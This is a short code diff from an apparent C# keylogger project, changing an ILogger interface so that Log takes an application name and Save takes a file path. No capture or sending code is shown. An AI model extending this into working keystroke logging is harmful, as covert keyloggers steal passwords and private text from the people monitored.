@@ -6,7 +6,7 @@ namespace KeyLogger.Loggers
 {
     interface ILogger
     {
-        void Log(string value);
-        void Save();
+        void Log(string application, string value);
+        void Save(string filePath);
     }
 }
